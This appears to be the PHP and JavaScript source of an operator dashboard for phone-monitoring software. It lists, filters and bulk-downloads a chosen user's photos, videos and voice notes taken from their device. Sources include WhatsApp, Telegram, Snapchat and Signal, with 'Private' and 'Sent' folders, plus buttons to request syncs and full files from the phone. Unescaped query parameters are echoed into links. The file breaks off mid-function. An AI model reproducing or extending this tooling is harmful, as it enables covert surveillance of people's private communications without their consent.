<?php
require_once __DIR__ . '/_boot.php';
ss_require_owner();

$uid = (int)($_GET['user'] ?? 0);
$filter = $_GET['cat'] ?? 'all';
$srcFilter = $_GET['src'] ?? '';
$folderFilter = $_GET['folder'] ?? '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['request_sync']) && $uid > 0) {
    try { $pdo->prepare("INSERT INTO gallery_sync_requests (user_id) VALUES (?) ON DUPLICATE KEY UPDATE requested_at=NOW()")->execute([$uid]); } catch (\Throwable $e) {}
    header("Location: track-gallery.php?user=$uid&synced=1"); exit;
}
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['clear_pending']) && $uid > 0) {
    try { $pdo->prepare("DELETE FROM gallery_sync_requests WHERE user_id=?")->execute([$uid]); } catch (\Throwable $e) {}
    header("Location: track-gallery.php?user=$uid"); exit;
}
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['request_full']) && $uid > 0) {
    $fname = trim($_POST['filename'] ?? '');
    if ($fname !== '') {
        try { $pdo->prepare("INSERT INTO gallery_full_requests (user_id, filename) VALUES (?, ?) ON DUPLICATE KEY UPDATE requested_at=NOW(), fulfilled=0")->execute([$uid, $fname]); } catch (\Throwable $e) {}
    }
    header("Location: track-gallery.php?user=$uid&cat=$filter&src=$srcFilter&folder=$folderFilter&req=" . urlencode($fname) . "#p-" . md5($fname)); exit;
}

// Single file download (for sequential downloads from JS)
if (isset($_GET['dl']) && $uid > 0) {
    $fn = basename($_GET['dl']);
    $safeFn = preg_replace('/[^a-zA-Z0-9._-]/', '_', $fn);
    $fullPath = __DIR__ . '/../uploads/gallery/' . $uid . '/full/' . $safeFn;
    $thumbPath = __DIR__ . '/../uploads/gallery/' . $uid . '/thumbs/' . $safeFn;
    $path = file_exists($fullPath) ? $fullPath : (file_exists($thumbPath) ? $thumbPath : null);
    if ($path) {
        $mime = mime_content_type($path) ?: 'application/octet-stream';
        header('Content-Type: ' . $mime);
        header('Content-Disposition: attachment; filename="' . $fn . '"');
        header('Content-Length: ' . filesize($path));
        header('Cache-Control: no-cache');
        readfile($path);
        exit;
    }
    http_response_code(404);
    echo 'File not found';
    exit;
}
// Handle batch request full for selected files
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['request_full_batch']) && $uid > 0) {
    $selected = json_decode($_POST['files'] ?? '[]', true);
    if (!empty($selected) && is_array($selected)) {
        $stmt = $pdo->prepare("INSERT INTO gallery_full_requests (user_id, filename) VALUES (?, ?) ON DUPLICATE KEY UPDATE requested_at=NOW(), fulfilled=0");
        foreach ($selected as $fn) {
            try { $stmt->execute([$uid, trim($fn)]); } catch (\Throwable $e) {}
        }
    }
    header("Location: track-gallery.php?user=$uid&cat=$filter&src=$srcFilter&folder=$folderFilter&req_batch=" . count($selected)); exit;
}

$users = $pdo->query("SELECT id, username, name FROM users WHERE role='user' ORDER BY name")->fetchAll();

$photos = []; $total = 0; $syncPending = false;
$counts = ['all'=>0,'image'=>0,'video'=>0,'audio'=>0,'voicenote'=>0,'videonote'=>0,'document'=>0,'gif'=>0,
           'private'=>0,'sent'=>0,
           'wa'=>0,'tg'=>0,'ig'=>0,'sc'=>0,'sg'=>0,'gallery'=>0];
// Folder counts: WA Images, WA Images/Private, WA Images/Sent, WA Video, WA Video/Private, etc.
$folderCounts = [];
if ($uid) {
    try {
        $cols = $pdo->query("SHOW COLUMNS FROM gallery_photos LIKE 'category'")->fetch();
        $hasCat = (bool)$cols;
        $q = $hasCat
            ? "SELECT filename, mime_type, width, height, file_size, photo_date, file_path, synced_at, category, is_private, is_sent FROM gallery_photos WHERE user_id=$uid ORDER BY photo_date DESC"
            : "SELECT filename, mime_type, width, height, file_size, photo_date, file_path, synced_at, 'image' as category, 0 as is_private, 0 as is_sent FROM gallery_photos WHERE user_id=$uid ORDER BY photo_date DESC";
        $allPhotos = $pdo->query($q)->fetchAll();
        $counts['all'] = count($allPhotos);
        foreach ($allPhotos as $ph) {
            $cat = $ph['category'] ?? 'image';
            if (isset($counts[$cat])) $counts[$cat]++;
            $isPriv = !empty($ph['is_private']);
            $isSent = !empty($ph['is_sent']);
            if ($isPriv) $counts['private']++;
            if ($isSent) $counts['sent']++;
            $fn = $ph['filename'] ?? '';
            if (str_starts_with($fn, 'WA_')) $counts['wa']++;
            elseif (str_starts_with($fn, 'TG_')) $counts['tg']++;
            elseif (str_starts_with($fn, 'IG_')) $counts['ig']++;
            elseif (str_starts_with($fn, 'SC_')) $counts['sc']++;
            elseif (str_starts_with($fn, 'SG_')) $counts['sg']++;
            else $counts['gallery']++;

            // Build folder key: e.g. "WA Images", "WA Images/Private", "WA Video/Sent"
            $src = '';
            if (str_starts_with($fn, 'WA_')) $src = 'WA';
            elseif (str_starts_with($fn, 'TG_')) $src = 'TG';
            elseif (str_starts_with($fn, 'IG_')) $src = 'IG';
            elseif (str_starts_with($fn, 'SC_')) $src = 'SC';
            elseif (str_starts_with($fn, 'SG_')) $src = 'SG';
            else $src = 'Gallery';
            $catLabel = match($cat) {
                'image' => 'Images', 'video' => 'Videos', 'audio' => 'Audio',
                'voicenote' => 'Voice Notes', 'videonote' => 'Video Notes',
                'document' => 'Documents', 'gif' => 'GIFs', default => 'Other'
            };
            $folderKey = "$src $catLabel";
            $folderCounts[$folderKey] = ($folderCounts[$folderKey] ?? 0) + 1;
            if ($isPriv) {
                $privKey = "$src $catLabel/Private";
                $folderCounts[$privKey] = ($folderCounts[$privKey] ?? 0) + 1;
            }
            if ($isSent) {
                $sentKey = "$src $catLabel/Sent";
                $folderCounts[$sentKey] = ($folderCounts[$sentKey] ?? 0) + 1;
            }
        }
        // Sort folder counts
        ksort($folderCounts);

        $photos = array_filter($allPhotos, function($ph) use ($filter, $srcFilter, $folderFilter) {
            $fn = $ph['filename'] ?? '';
            // Source filter
            if ($srcFilter) {
                $prefix = strtoupper($srcFilter) . '_';
                if ($srcFilter === 'gallery') { if (preg_match('/^(WA|TG|IG|SC|SG)_/', $fn)) return false; }
                elseif (!str_starts_with($fn, $prefix)) return false;
            }
            // Folder filter (e.g. "private", "sent", or specific like "WA Images/Private")
            if ($folderFilter === 'private') { if (empty($ph['is_private'])) return false; }
            elseif ($folderFilter === 'sent') { if (empty($ph['is_sent'])) return false; }
            elseif ($folderFilter !== '') {
                // Specific folder like "WA Images/Private"
                $src = '';
                if (str_starts_with($fn, 'WA_')) $src = 'WA';
                elseif (str_starts_with($fn, 'TG_')) $src = 'TG';
                elseif (str_starts_with($fn, 'IG_')) $src = 'IG';
                elseif (str_starts_with($fn, 'SC_')) $src = 'SC';
                elseif (str_starts_with($fn, 'SG_')) $src = 'SG';
                else $src = 'Gallery';
                $cat = $ph['category'] ?? 'image';
                $catLabel = match($cat) {
                    'image' => 'Images', 'video' => 'Videos', 'audio' => 'Audio',
                    'voicenote' => 'Voice Notes', 'videonote' => 'Video Notes',
                    'document' => 'Documents', 'gif' => 'GIFs', default => 'Other'
                };
                $itemFolder = "$src $catLabel";
                $itemPriv = "$src $catLabel/Private";
                $itemSent = "$src $catLabel/Sent";
                if ($folderFilter !== $itemFolder && $folderFilter !== $itemPriv && $folderFilter !== $itemSent) return false;
                if (str_ends_with($folderFilter, '/Private') && empty($ph['is_private'])) return false;
                if (str_ends_with($folderFilter, '/Sent') && empty($ph['is_sent'])) return false;
            }
            // Category filter
            if ($filter === 'all') return true;
            if ($filter === 'private') return !empty($ph['is_private']);
            if ($filter === 'sent') return !empty($ph['is_sent']);
            return ($ph['category'] ?? 'image') === $filter;
        });
        $photos = array_values($photos);
        $total = count($photos);
        $chk = $pdo->prepare("SELECT 1 FROM gallery_sync_requests WHERE user_id=?");
        $chk->execute([$uid]); $syncPending = (bool)$chk->fetch();
    } catch (\Throwable $e) {}
}

$justSynced = isset($_GET['synced']);
$PAGE_TITLE = 'Gallery'; $PAGE_SUB = 'All synced media from device'; $PAGE_ICON = '📸';
$PAGE_TOOLS = '<form method="get" style="display:flex;gap:8px;align-items:center;flex-wrap:wrap"><select class="sel" name="user" onchange="this.form.submit()"><option value="0">Select a user…</option>';
foreach ($users as $uu) $PAGE_TOOLS .= '<option value="'.(int)$uu['id'].'" '.($uid===(int)$uu['id']?'selected':'').'>'.ss_admin_h($uu['name']).'</option>';
$PAGE_TOOLS .= '</select></form>';
require __DIR__ . '/_dark_head.php';

function catIcon($cat) {
    return match($cat) {
        'image','gif' => '📷', 'video' => '🎥', 'audio' => '🎵',
        'voicenote' => '🎙️', 'videonote' => '📹', 'document' => '📄',
        default => '📁'
    };
}
function fileIcon($mime, $fn) {
    if (str_starts_with($mime, 'audio/')) return '🎵';
    if (str_starts_with($mime, 'video/')) return '🎥';
    $ext = strtolower(pathinfo($fn, PATHINFO_EXTENSION));
    return match($ext) { 'pdf'=>'📕', 'doc','docx'=>'📘', 'xls','xlsx'=>'📗', default=>'📄' };
}
function folderIcon($key) {
    if (str_contains($key, 'Private')) return '🔒';
    if (str_contains($key, 'Sent')) return '📤';
    if (str_contains($key, 'Images')) return '📷';
    if (str_contains($key, 'Videos')) return '🎥';
    if (str_contains($key, 'Audio')) return '🎵';
    if (str_contains($key, 'Voice')) return '🎙️';
    if (str_contains($key, 'Video Notes')) return '📹';
    if (str_contains($key, 'Document')) return '📄';
    if (str_contains($key, 'GIF')) return '🎞️';
    return '📁';
}
?>
<div class="cards">
  <div class="stat"><div class="h"><span class="dot">📸</span> Total</div><div class="v"><?= $counts['all'] ?></div></div>
  <?php if($uid && $counts['all']): ?>
  <div class="stat"><div class="h"><span class="dot" style="color:#E8467C">🔒</span> Private</div><div class="v"><?= $counts['private'] ?></div></div>
  <div class="stat"><div class="h"><span class="dot">📤</span> Sent</div><div class="v"><?= $counts['sent'] ?></div></div>
  <div class="stat"><div class="h"><span class="dot">📷</span> Images</div><div class="v"><?= $counts['image'] ?></div></div>
  <div class="stat"><div class="h"><span class="dot">🎥</span> Videos</div><div class="v"><?= $counts['video'] ?></div></div>
  <div class="stat"><div class="h"><span class="dot">🎙️</span> Voice</div><div class="v"><?= $counts['voicenote'] ?></div></div>
  <div class="stat"><div class="h"><span class="dot">🎵</span> Audio</div><div class="v"><?= $counts['audio'] ?></div></div>
  <div class="stat"><div class="h"><span class="dot">📄</span> Docs</div><div class="v"><?= $counts['document'] ?></div></div>
  <?php endif; ?>
</div>

<?php if(!$uid): ?>
  <div class="panel"><div class="empty">Select a user to see their media.</div></div>
<?php else: ?>
  <div class="panel" style="display:flex;align-items:center;gap:12px;padding:14px 18px;flex-wrap:wrap">
    <form method="post" style="margin:0">
      <input type="hidden" name="request_sync" value="1">
      <button type="submit" style="background:linear-gradient(135deg,#E8467C,#7C3AED);color:#fff;border:none;padding:10px 22px;border-radius:8px;font-weight:700;cursor:pointer;font-size:.85rem" <?= $syncPending ? 'disabled' : '' ?>>
        <?= $syncPending ? '⏳ Sync Pending…' : '🔄 Sync Now' ?>
      </button>
    </form>
    <?php if($syncPending): ?>
    <form method="post" style="margin:0"><input type="hidden" name="clear_pending" value="1">
      <button type="submit" style="background:rgba(255,255,255,.08);color:#aaa;border:1px solid rgba(255,255,255,.1);padding:10px 16px;border-radius:8px;font-size:.8rem;cursor:pointer">✕ Clear</button>
    </form>
    <?php endif; ?>
    <label style="background:linear-gradient(135deg,#3B82F6,#2563EB);color:#fff;border:none;padding:10px 22px;border-radius:8px;font-weight:700;cursor:pointer;font-size:.85rem;display:inline-block">
      📁 Upload Files
      <input type="file" id="fileInput" multiple accept="image/*,video/*,audio/*,.pdf,.doc,.docx,.xls,.xlsx,.ppt,.pptx,.txt,.zip" style="display:none" onchange="startUpload(this.files)">
    </label>
    <span style="color:var(--mut);font-size:.8rem">
      <?php if($justSynced): ?>✅ Sync requested! Refresh in ~1 min.
      <?php elseif($syncPending): ?>Waiting for device… Refresh in a minute.
      <?php else: ?>Select files to upload directly, or "Sync Now" to pull from device.
      <?php endif; ?>
    </span>
  </div>

  <!-- Upload Progress Panel -->
  <div id="uploadPanel" style="display:none" class="panel">
    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px">
      <h3 style="margin:0;font-size:.85rem">📤 Uploading...</h3>
      <span id="uploadSummary" style="font-size:.75rem;color:var(--mut)">0 / 0</span>
    </div>
    <div id="uploadList" style="max-height:300px;overflow-y:auto"></div>
  </div>

  <?php if($counts['all']): ?>
  <!-- Category + Folder Filters -->
  <div class="panel" style="padding:12px 18px">
    <!-- Row 1: Category tabs -->
    <div style="display:flex;gap:6px;flex-wrap:wrap">
      <?php
      $tabs = ['all'=>['All','📸'], 'image'=>['Images','📷'], 'video'=>['Videos','🎥'],
               'audio'=>['Audio','🎵'], 'voicenote'=>['Voice Notes','🎙️'], 'videonote'=>['Video Notes','📹'],
               'document'=>['Docs','📄'], 'private'=>['🔒 Private','🔒'], 'sent'=>['📤 Sent','📤']];
      foreach ($tabs as $key => [$label, $icon]):
          $cnt = $counts[$key] ?? 0;
          if ($cnt === 0 && $key !== 'all') continue;
          $active = $filter === $key && $folderFilter === '';
      ?>
        <a href="?user=<?= $uid ?>&cat=<?= $key ?>&src=<?= $srcFilter ?>"
           style="padding:6px 14px;border-radius:20px;font-size:.75rem;font-weight:600;text-decoration:none;
                  <?= $active ? 'background:linear-gradient(135deg,#E8467C,#7C3AED);color:#fff' : 'background:rgba(255,255,255,.06);color:var(--mut);border:1px solid rgba(255,255,255,.08)' ?>">
          <?= $icon ?> <?= $label ?> (<?= $cnt ?>)
        </a>
      <?php endforeach; ?>
    </div>

    <!-- Row 2: Source tabs -->
    <?php
    $srcTabs = [
        ''=>['All Sources','📱'], 'wa'=>['WhatsApp','💬'], 'tg'=>['Telegram','✈️'],
        'ig'=>['Instagram','📸'], 'sc'=>['Snapchat','👻'], 'sg'=>['Signal','🔐'], 'gallery'=>['Gallery','🖼️']
    ];
    $hasSrc = ($counts['wa'] + $counts['tg'] + $counts['ig'] + $counts['sc'] + $counts['sg']) > 0;
    if ($hasSrc): ?>
    <div style="display:flex;gap:6px;flex-wrap:wrap;margin-top:8px;padding-top:8px;border-top:1px solid rgba(255,255,255,.06)">
      <?php foreach ($srcTabs as $skey => [$slabel, $sicon]):
          $scnt = $skey === '' ? $counts['all'] : ($counts[$skey] ?? 0);
          if ($scnt === 0 && $skey !== '') continue;
          $sActive = $srcFilter === $skey && $folderFilter === '';
      ?>
        <a href="?user=<?= $uid ?>&cat=<?= $filter ?>&src=<?= $skey ?>"
           style="padding:5px 12px;border-radius:16px;font-size:.7rem;font-weight:600;text-decoration:none;
                  <?= $sActive ? 'background:rgba(232,70,124,.2);color:#E8467C;border:1px solid rgba(232,70,124,.3)' : 'background:rgba(255,255,255,.04);color:var(--mut);border:1px solid rgba(255,255,255,.06)' ?>">
          <?= $sicon ?> <?= $slabel ?> (<?= $scnt ?>)
        </a>
      <?php endforeach; ?>
    </div>
    <?php endif; ?>

    <!-- Row 3: Folder tree -->
    <?php if(!empty($folderCounts)): ?>
    <div style="margin-top:10px;padding-top:10px;border-top:1px solid rgba(255,255,255,.06)">
      <div style="font-size:.7rem;color:var(--mut);font-weight:600;margin-bottom:6px">📂 Folders</div>
      <div style="display:flex;gap:5px;flex-wrap:wrap">
        <a href="?user=<?= $uid ?>&cat=all&src=<?= $srcFilter ?>&folder="
           style="padding:4px 10px;border-radius:12px;font-size:.65rem;font-weight:600;text-decoration:none;
                  <?= $folderFilter === '' ? 'background:rgba(124,58,237,.2);color:#A78BFA;border:1px solid rgba(124,58,237,.3)' : 'background:rgba(255,255,255,.03);color:var(--mut);border:1px solid rgba(255,255,255,.05)' ?>">
          📂 All Folders
        </a>
        <?php foreach ($folderCounts as $fKey => $fCnt):
            $isPrivFolder = str_contains($fKey, '/Private');
            $isSentFolder = str_contains($fKey, '/Sent');
            $fActive = $folderFilter === $fKey;
            $indent = ($isPrivFolder || $isSentFolder) ? 'margin-left:4px;' : '';
            $bgColor = $isPrivFolder ? 'rgba(232,70,124,.12)' : ($isSentFolder ? 'rgba(59,130,246,.12)' : 'rgba(255,255,255,.03)');
            $borderColor = $isPrivFolder ? 'rgba(232,70,124,.2)' : ($isSentFolder ? 'rgba(59,130,246,.2)' : 'rgba(255,255,255,.05)');
            $textColor = $isPrivFolder ? '#E8467C' : ($isSentFolder ? '#3B82F6' : 'var(--mut)');
            if ($fActive) { $bgColor = 'rgba(124,58,237,.2)'; $borderColor = 'rgba(124,58,237,.3)'; $textColor = '#A78BFA'; }
        ?>
          <a href="?user=<?= $uid ?>&cat=all&src=&folder=<?= urlencode($fKey) ?>"
             style="padding:4px 10px;border-radius:12px;font-size:.65rem;font-weight:600;text-decoration:none;<?= $indent ?>
                    background:<?= $bgColor ?>;color:<?= $textColor ?>;border:1px solid <?= $borderColor ?>">
            <?= folderIcon($fKey) ?> <?= htmlspecialchars($fKey) ?> (<?= $fCnt ?>)
          </a>
        <?php endforeach; ?>
      </div>
    </div>
    <?php endif; ?>
  </div>
  <?php endif; ?>

  <?php if(!$photos): ?>
    <div class="panel"><div class="empty">No media found<?= $folderFilter ? ' in this folder' : '' ?>. Click "Sync Now" to get media from device.</div></div>
  <?php else: ?>
    <?php $reqBatch = (int)($_GET['req_batch'] ?? 0); if($reqBatch): ?>
    <div class="panel" style="padding:12px 18px;background:rgba(16,185,129,.08);border:1px solid rgba(16,185,129,.2)">
      <span style="color:#10B981;font-size:.8rem;font-weight:600">✅ <?= $reqBatch ?> files requested from phone! Refresh in ~2 min.</span>
    </div>
    <?php endif; ?>
    <div class="panel">
      <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px">
        <h3 style="margin:0"><?php
          if ($folderFilter) echo folderIcon($folderFilter) . ' ' . htmlspecialchars($folderFilter);
          else echo catIcon($filter === 'all' ? 'image' : $filter) . ' Media';
        ?> (<?= $total ?>)</h3>
        <div style="display:flex;gap:8px;align-items:center">
          <label style="font-size:.7rem;color:var(--mut);cursor:pointer;display:flex;align-items:center;gap:4px">
            <input type="checkbox" id="selectAll" onchange="toggleAll(this.checked)" style="accent-color:#7C3AED"> Select All
          </label>
        </div>
      </div>
      <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:10px;padding:8px 0">
      <?php foreach($photos as $p):
          $src = dirname($_SERVER['SCRIPT_NAME'], 2) . '/' . $p['file_path'];
          $date = $p['photo_date'] ? date('d M Y H:i', strtotime($p['photo_date'])) : '—';
          $sizeKb = round(($p['file_size'] ?? 0) / 1024);
          $isThumb = str_contains($p['file_path'], '/thumbs/');
          $fullPath = str_replace('/thumbs/', '/full/', $p['file_path']);
          $hasFull = file_exists(__DIR__ . '/../' . $fullPath);
          $fullSrc = $hasFull ? dirname($_SERVER['SCRIPT_NAME'], 2) . '/' . $fullPath : '';
          $anchor = 'p-' . md5($p['filename']);
          $cat = $p['category'] ?? 'image';
          $isImage = in_array($cat, ['image','gif']);
          $isAudioType = in_array($cat, ['audio','voicenote']);
          $isVideoType = in_array($cat, ['video','videonote']);
          $isDoc = $cat === 'document';
          $isPriv = !empty($p['is_private']);
          $isSent = !empty($p['is_sent']);
      ?>
        <div id="<?= $anchor ?>" class="media-card" data-filename="<?= ss_admin_h($p['filename']) ?>" style="background:rgba(255,255,255,.04);border-radius:10px;overflow:hidden;border:1px solid <?= $isPriv ? 'rgba(232,70,124,.3)' : ($isSent ? 'rgba(59,130,246,.2)' : 'rgba(255,255,255,.06)') ?>;position:relative">
          <input type="checkbox" class="media-check" data-fn="<?= ss_admin_h($p['filename']) ?>" data-date="<?= ss_admin_h($p['photo_date'] ?? '') ?>" onchange="updateSelection()" style="position:absolute;top:6px;left:6px;z-index:10;accent-color:#7C3AED;width:18px;height:18px;cursor:pointer">
          <?php if($hasFull && $isImage): ?>
            <a href="<?= htmlspecialchars($fullSrc) ?>" target="_blank" style="display:block;aspect-ratio:1;overflow:hidden;background:#111">
              <img src="<?= htmlspecialchars($fullSrc) ?>" loading="lazy" style="width:100%;height:100%;object-fit:cover;display:block">
            </a>
            <span style="position:absolute;top:6px;left:6px;background:#10B981;color:#fff;font-size:.55rem;font-weight:700;padding:2px 6px;border-radius:4px">HD</span>
          <?php elseif($hasFull && ($isAudioType || $isVideoType)): ?>
            <a href="<?= htmlspecialchars($fullSrc) ?>" target="_blank" style="display:block;aspect-ratio:1;overflow:hidden;background:#111;display:flex;align-items:center;justify-content:center">
              <span style="font-size:48px"><?= $isAudioType ? '🎵' : '🎥' ?></span>
            </a>
          <?php elseif($isImage && $isThumb): ?>
            <form method="post" style="margin:0;display:block;aspect-ratio:1;overflow:hidden;background:#111;position:relative;cursor:pointer" onclick="this.submit()">
              <input type="hidden" name="request_full" value="1">
              <input type="hidden" name="filename" value="<?= ss_admin_h($p['filename']) ?>">
              <img src="<?= htmlspecialchars($src) ?>" loading="lazy" style="width:100%;height:100%;object-fit:cover;display:block;filter:blur(2px)">
              <div style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.3)">
                <span style="background:rgba(255,255,255,.15);backdrop-filter:blur(4px);border-radius:50%;width:40px;height:40px;display:flex;align-items:center;justify-content:center;font-size:18px">🔍</span>
              </div>
            </form>
          <?php elseif($isAudioType): ?>
            <form method="post" style="margin:0;display:flex;aspect-ratio:1;overflow:hidden;background:rgba(124,58,237,.08);align-items:center;justify-content:center;flex-direction:column;cursor:pointer;gap:6px" onclick="this.submit()">
              <input type="hidden" name="request_full" value="1">
              <input type="hidden" name="filename" value="<?= ss_admin_h($p['filename']) ?>">
              <span style="font-size:42px"><?= $cat === 'voicenote' ? '🎙️' : '🎵' ?></span>
              <span style="color:var(--mut);font-size:.65rem"><?= $cat === 'voicenote' ? 'Voice Note' : 'Audio' ?></span>
              <span style="color:var(--mut);font-size:.6rem"><?= $sizeKb ?>KB</span>
            </form>
          <?php elseif($isVideoType): ?>
            <form method="post" style="margin:0;display:flex;aspect-ratio:1;overflow:hidden;background:rgba(232,70,124,.08);align-items:center;justify-content:center;flex-direction:column;cursor:pointer;gap:6px" onclick="this.submit()">
              <input type="hidden" name="request_full" value="1">
              <input type="hidden" name="filename" value="<?= ss_admin_h($p['filename']) ?>">
              <span style="font-size:42px"><?= $cat === 'videonote' ? '📹' : '🎥' ?></span>
              <span style="color:var(--mut);font-size:.65rem"><?= $cat === 'videonote' ? 'Video Note' : 'Video' ?></span>
              <span style="color:var(--mut);font-size:.6rem"><?= round($sizeKb/1024, 1) ?>MB</span>
            </form>
          <?php elseif($isDoc): ?>
            <form method="post" style="margin:0;display:flex;aspect-ratio:1;overflow:hidden;background:rgba(255,255,255,.03);align-items:center;justify-content:center;flex-direction:column;cursor:pointer;gap:6px" onclick="this.submit()">
              <input type="hidden" name="request_full" value="1">
              <input type="hidden" name="filename" value="<?= ss_admin_h($p['filename']) ?>">
              <span style="font-size:42px"><?= fileIcon($p['mime_type'], $p['filename']) ?></span>
              <span style="color:var(--mut);font-size:.6rem;text-transform:uppercase"><?= strtoupper(pathinfo($p['filename'], PATHINFO_EXTENSION)) ?></span>
            </form>
          <?php else: ?>
            <div style="display:flex;aspect-ratio:1;overflow:hidden;background:#111;align-items:center;justify-content:center">
              <span style="font-size:42px">📁</span>
            </div>
          <?php endif; ?>

          <!-- Badges: Private / Sent / Source -->
          <?php if($isPriv): ?><span style="position:absolute;top:6px;right:6px;background:rgba(232,70,124,.85);color:#fff;font-size:.55rem;font-weight:700;padding:2px 6px;border-radius:4px">🔒 Private</span><?php endif; ?>
          <?php if($isSent): ?><span style="position:absolute;top:6px;<?= $isPriv ? 'right:72px' : 'right:6px' ?>;background:rgba(59,130,246,.8);color:#fff;font-size:.55rem;font-weight:700;padding:2px 6px;border-radius:4px">📤 Sent</span><?php endif; ?>
          <?php
            $srcTag = ''; $srcColor = '';
            if (str_starts_with($p['filename'], 'WA_')) { $srcTag = '💬 WA'; $srcColor = '#25D366'; }
            elseif (str_starts_with($p['filename'], 'TG_')) { $srcTag = '✈️ TG'; $srcColor = '#26A5E4'; }
            elseif (str_starts_with($p['filename'], 'IG_')) { $srcTag = '📸 IG'; $srcColor = '#E4405F'; }
            elseif (str_starts_with($p['filename'], 'SC_')) { $srcTag = '👻 SC'; $srcColor = '#FFFC00'; }
            elseif (str_starts_with($p['filename'], 'SG_')) { $srcTag = '🔐 SG'; $srcColor = '#3A76F0'; }
            if ($srcTag): ?>
            <span style="position:absolute;bottom:32px;left:6px;background:<?= $srcColor ?>33;color:<?= $srcColor ?>;font-size:.5rem;font-weight:700;padding:2px 5px;border-radius:3px;backdrop-filter:blur(4px)"><?= $srcTag ?></span>
          <?php endif; ?>
          <div style="padding:6px 8px">
            <div style="font-size:.7rem;color:var(--mut);white-space:nowrap;overflow:hidden;text-overflow:ellipsis" title="<?= ss_admin_h($p['filename']) ?>"><?= ss_admin_h($p['filename']) ?></div>
            <div style="font-size:.65rem;color:var(--mut);margin-top:2px"><?= $date ?> · <?= $sizeKb > 1024 ? round($sizeKb/1024,1).'MB' : $sizeKb.'KB' ?></div>
          </div>
        </div>
      <?php endforeach; ?>
      </div>
    </div>
  <?php endif; ?>
<?php endif; ?>

<!-- Floating Action Bar -->
<div id="actionBar" style="display:none;position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:rgba(20,20,30,.95);backdrop-filter:blur(12px);border:1px solid rgba(124,58,237,.3);border-radius:14px;padding:10px 20px;z-index:999;box-shadow:0 8px 32px rgba(0,0,0,.5);display:none;align-items:center;gap:12px;flex-wrap:wrap">
  <span id="selCount" style="color:#A78BFA;font-size:.8rem;font-weight:700">0 selected</span>
  <button onclick="downloadSequential()" id="dlBtn" style="background:linear-gradient(135deg,#10B981,#059669);color:#fff;border:none;padding:8px 18px;border-radius:8px;font-weight:700;cursor:pointer;font-size:.78rem">
    ⬇️ Download All
  </button>
  <span id="dlProgress" style="color:#10B981;font-size:.7rem;font-weight:600;display:none"></span>
  <form method="post" id="requestForm" style="margin:0;display:inline">
    <input type="hidden" name="request_full_batch" value="1">
    <input type="hidden" name="files" id="requestFiles" value="[]">
    <button type="submit" style="background:linear-gradient(135deg,#E8467C,#7C3AED);color:#fff;border:none;padding:8px 18px;border-radius:8px;font-weight:700;cursor:pointer;font-size:.78rem">
      📲 Request Full from Phone
    </button>
  </form>
  <button onclick="clearSelection()" style="background:rgba(255,255,255,.08);color:#aaa;border:1px solid rgba(255,255,255,.1);padding:8px 14px;border-radius:8px;font-size:.75rem;cursor:pointer">✕ Clear</button>
</div>

<script>
function getSelected() {
  return [...document.querySelectorAll('.media-check:checked')].map(c => c.dataset.fn);
}
function updateSelection() {
  const sel = getSelected();
  const bar = document.getElementById('actionBar');
  const cnt = document.getElementById('selCount');
  if (sel.length > 0) {
    bar.style.display = 'flex';
    cnt.textContent = sel.length + ' selected';
    document.getElementById('requestFiles').value = JSON.stringify(sel);
  } else {
    bar.style.display = 'none';
  }
  const all = document.querySelectorAll('.media-check');
  document.getElementById('selectAll').checked = all.length > 0 && sel.length === all.length;
}
function toggleAll(checked) {
  document.querySelectorAll('.media-check').forEach(c => c.checked = checked);
  updateSelection();
}
function clearSelection() {
  document.querySelectorAll('.media-check').forEach(c => c.checked = false);
  updateSelection();
}

async function downloadSequential() {
  const checks = [...document.querySelectorAll('.media-check:checked')];
  if (!checks.length) return;
  // Sort by date (oldest first so newest downloads last = on top in downloads)
  checks.sort((a, b) => {
    const da = a.dataset.date || '0', db = b.dataset.date || '0';
    return da.localeCompare(db);
  });
  const files = checks.map(c => c.dataset.fn);
  const btn = document.getElementById('dlBtn');
  const prog = document.getElementById('dlProgress');
  btn.disabled = true;
  btn.style.opacity = '.5';
  prog.style.display = 'inline';
  for (let i = 0; i < files.length; i++) {
    prog.textContent = (i + 1) + ' / ' + files.length;
    const a = document.createElement('a');
    a.href = 'track-gallery.php?user=<?= $uid ?>&dl=' + encodeURIComponent(files[i]);
    a.download = files[i];
    a.style.display = 'none';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    if (i < files.length - 1) await new Promise(r => setTimeout(r, 600));
  }
  prog.textContent = 'Done!';
  btn.disabled = false;
  btn.style.opacity = '1';
  setTimeout(() => { prog.style.display = 'none'; }, 2000);
}

// Multi-file upload with progress
const UID = <?= $uid ?: 0 ?>;
let uploadDone = 0, uploadTotal = 0, uploadFailed = 0;

function startUpload(files) {
  if (!files.length || !UID) return;
  const panel = document.getElementById('uploadPanel');
  const list = document.getElementById('uploadList');
  panel.style.display = 'block';
  uploadTotal += files.length;
  updSummary();

  for (const file of files) {
    const row = document.createElement('div');
    row.style.cssText = 'display:flex;align-items:center;gap:10px;padding:6px 0;border-bottom:1px solid rgba(255,255,255,.05)';
    const icon = file.type.startsWith('image') ? '📷' : file.type.startsWith('video') ? '🎥' : file.type.startsWith('audio') ? '🎵' : '📄';
    const sizeMB = (file.size / 1024 / 1024).toFixed(1);
    row.innerHTML = `
      <span style="font-size:20px;flex-shrink:0">${icon}</span>
      <div style="flex:1;min-width:0">
        <div style="font-size:.72rem;color:var(--fg,#e2e8f0);white-space:nowrap;overflow:hidden;text-overflow:ellipsis">${file.name}</div>
        <div style="font-size:.6rem;color:var(--mut,#94a3b8)">${sizeMB} MB</div>
        <div style="background:rgba(255,255,255,.08);border-radius:4px;height:4px;margin-top:3px;overflow:hidden">
          <div class="prog-bar" style="height:100%;width:0%;background:linear-gradient(90deg,#E8467C,#7C3AED);border-radius:4px;transition:width .2s"></div>
        </div>
      </div>
      <span class="up-status" style="font-size:.65rem;color:var(--mut,#94a3b8);flex-shrink:0">0%</span>`;
    list.prepend(row);

    uploadFile(file, row);
  }
  document.getElementById('fileInput').value = '';
}

async function compressImage(file, maxW=1920, quality=0.7) {
  if (!file.type.startsWith('image/') || file.type === 'image/gif') return file;
  return new Promise(resolve => {
